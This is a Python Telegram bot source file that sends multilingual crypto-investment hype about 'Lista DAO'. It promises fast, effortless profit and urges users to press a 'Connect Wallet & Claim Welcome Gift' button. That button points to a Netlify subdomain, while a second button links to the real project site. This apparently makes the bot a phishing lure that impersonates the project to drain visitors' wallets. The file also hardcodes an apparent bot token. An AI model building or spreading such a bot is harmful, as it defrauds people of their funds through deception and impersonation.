import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import http.server
import socketserver
import threading
import os

# ── HTTP server for Render ──────────────────────────────────────────────────
def run_http_server():
    port = int(os.environ.get("PORT", 8080))

    class MyHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Bot is running!")

        def log_message(self, format, *args):
            pass

    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", port), MyHandler) as httpd:
        print(f"HTTP server on port {port}")
        httpd.serve_forever()

threading.Thread(target=run_http_server, daemon=True).start()

# ── Bot setup ───────────────────────────────────────────────────────────────
TOKEN = os.environ.get("TOKEN", "8203505096:AAFpLzgp4xbNHHsc0IlQ4PSdjOL1s467e9Q")
bot = telebot.TeleBot(TOKEN)

# ── Texts per language ──────────────────────────────────────────────────────
TEXTS = {
    "ar": {
        "welcome": (
            "الفرص الكبرى لا تنتظر المترددين!\n\n"
            "مرحباً بك في المنصة التي يختارها المستثمرون الأذكياء للاستفادة من أقوى طفرة مالية حالياً في سوق الكريبتو: مشروع Lista DAO! 🔥\n\n"
            "لماذا يركض الجميع للاستثمار في هذه العملة الآن؟ لأنها تمنحك ما تبحث عنه بالضبط: أقصى ربح، بأسرع وقت، وبأقل مجهود.\n\n"
            "💰 المزايا التي ستجعلك تحقق أرباحاً مضاعفة من اليوم:\n"
            "⚡ *ربح مزدوج في نفس اللحظة (Liquid Staking)*: ارهن عملات $BNB واحصل على عوائد فورية، وبنفس الوقت استلم توكن $slisBNB لتتداول به وتحقق ربحاً آخر! (أموالك تعمل لحسابك في جهتين معاً).\n\n"
            "💸 *سيولة كاش فورية دون بيع*: هل تحتاج دولار رقمي الآن؟ بدلاً من بيع عملاتك وخسارة ارتفاعها المستقبلي، استخدمها كضمان واقترض فوراً عملة $lisUSD المستقرة واستغلها في صفقات سريعة.\n\n"
            "🎁 *تذكرة مجانية لأقوى مشاريع Binance*: بمجرد دخولك، تفتح لنفسك الباب تلقائياً للمشاركة في فرص Megadrop و Launchpool الحصرية وتحصل على عملات جديدة قبل الجميع!\n\n"
            "🔥 نافذة الفرصة مغلقة قريباً.. القرار لك:\n"
            "السوق يتحرك بسرعة، ومن يقتنص الفرصة في بدايتها هو الوحيد الذي يضاعف رأس ماله.\n\n"
            "🌟 العملة الأساسية للاستثمار: *LISTA*\n"
            "💎 مفتاح الأرباح السريعة: *slisBNB*\n\n"
            "⏱️ الوقت يساوي مالاً، والعداد بدأ بالفعل!\n\n"
            "لا تكن مجرد متفرج وتتحسر على فوات الأرباح. اضغط على الزر أدناه الآن واجعل أموالك تولّد لك دخلاً تلقائياً خلال دقائق معدودة! 👇"
        ),
        "btn_wallet": "ربط المحفظة والحصول على هدية ترحيبية 🎁",
        "btn_official": "🌐 الموقع الرسمي للمشروع",
    },
    "en": {
        "welcome": (
            "Big opportunities don't wait for the hesitant!\n\n"
            "Welcome to the platform chosen by smart investors to benefit from the strongest financial boom in crypto right now: Lista DAO! 🔥\n\n"
            "Why is everyone rushing to invest in this token now? Because it gives you exactly what you're looking for: maximum profit, in the shortest time, with minimum effort.\n\n"
            "💰 Benefits that will multiply your earnings starting today:\n"
            "⚡ *Double profit at the same moment (Liquid Staking)*: Stake your $BNB and earn instant rewards, while simultaneously receiving $slisBNB tokens to trade and generate even more profit! (Your money works for you in two directions at once).\n\n"
            "💸 *Instant cash liquidity without selling*: Need digital dollars now? Instead of selling your crypto and missing future gains, use it as collateral and instantly borrow $lisUSD stablecoin for quick trades.\n\n"
            "🎁 *Free ticket to Binance's most powerful projects*: By joining, you automatically unlock access to exclusive Megadrop and Launchpool opportunities — getting new tokens before everyone else!\n\n"
            "🔥 The window of opportunity is closing soon... The choice is yours:\n"
            "The market moves fast. Those who seize opportunities early are the ones who multiply their capital.\n\n"
            "🌟 Core investment token: *LISTA*\n"
            "💎 Key to fast profits: *slisBNB*\n\n"
            "⏱️ Time is money, and the clock has already started!\n\n"
            "Don't just watch and regret missing out. Press the button below NOW and let your money generate automatic income in just minutes! 👇"
        ),
        "btn_wallet": "Connect Wallet & Claim Welcome Gift 🎁",
        "btn_official": "🌐 Official Project Website",
    },
    "fr": {
        "welcome": (
            "Les grandes opportunités n'attendent pas les hésitants!\n\n"
            "Bienvenue sur la plateforme choisie par les investisseurs intelligents pour profiter du boom financier le plus puissant du marché crypto en ce moment: Lista DAO! 🔥\n\n"
            "Pourquoi tout le monde se précipite-t-il pour investir dans ce token maintenant? Parce qu'il vous offre exactement ce que vous cherchez: profit maximum, en un temps record, avec un effort minimal.\n\n"
            "💰 Avantages qui multiplieront vos gains dès aujourd'hui:\n"
            "⚡ *Double profit au même moment (Liquid Staking)*: Stakez vos $BNB et obtenez des récompenses instantanées, tout en recevant des tokens $slisBNB pour trader et générer encore plus de profit! (Votre argent travaille dans deux directions simultanément).\n\n"
            "💸 *Liquidité cash instantanée sans vendre*: Besoin de dollars numériques maintenant? Au lieu de vendre vos cryptos et de rater les hausses futures, utilisez-les comme garantie et empruntez instantanément $lisUSD pour des transactions rapides.\n\n"
            "🎁 *Ticket gratuit pour les meilleurs projets Binance*: En rejoignant, vous débloquez automatiquement l'accès aux opportunités exclusives Megadrop et Launchpool — obtenez de nouveaux tokens avant tout le monde!\n\n"
            "🔥 La fenêtre d'opportunité se ferme bientôt... Le choix vous appartient:\n"
            "Le marché évolue vite. Ceux qui saisissent les opportunités tôt sont les seuls qui multiplient leur capital.\n\n"
            "🌟 Token d'investissement principal: *LISTA*\n"
            "💎 Clé des profits rapides: *slisBNB*\n\n"
            "⏱️ Le temps c'est de l'argent, et le compte à rebours a déjà commencé!\n\n"
            "Ne soyez pas spectateur et ne regrettez pas de rater les profits. Appuyez sur le bouton ci-dessous MAINTENANT et laissez votre argent générer un revenu automatique en quelques minutes! 👇"
        ),
        "btn_wallet": "Connecter le Portefeuille & Cadeau de Bienvenue 🎁",
        "btn_official": "🌐 Site Officiel du Projet",
    },
}

# ── /start → language selection ─────────────────────────────────────────────
@bot.message_handler(commands=['start'])
def send_language_selection(message):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("🇬🇧 English",  callback_data="lang_en"),
        InlineKeyboardButton("🇫🇷 Français", callback_data="lang_fr"),
        InlineKeyboardButton("🇸🇦 العربية",   callback_data="lang_ar"),
    )
    bot.send_message(
        message.chat.id,
        "🌍 Please choose your language / Choisissez votre langue / اختر لغتك:",
        reply_markup=markup
    )

# ── Language selected → show welcome ────────────────────────────────────────
@bot.callback_query_handler(func=lambda call: call.data.startswith("lang_"))
def handle_language(call):
    lang = call.data.split("_")[1]   # "ar", "en", or "fr"
    t = TEXTS.get(lang, TEXTS["ar"])

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(t["btn_wallet"],   url="https://connect-wallet-thejop790.netlify.app/"))
    markup.add(InlineKeyboardButton(t["btn_official"], url="https://lista.org/"))

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=t["welcome"],
        reply_markup=markup,
        parse_mode="Markdown"
    )
    bot.answer_callback_query(call.id)

print("Bot is running...")
bot.infinity_polling()
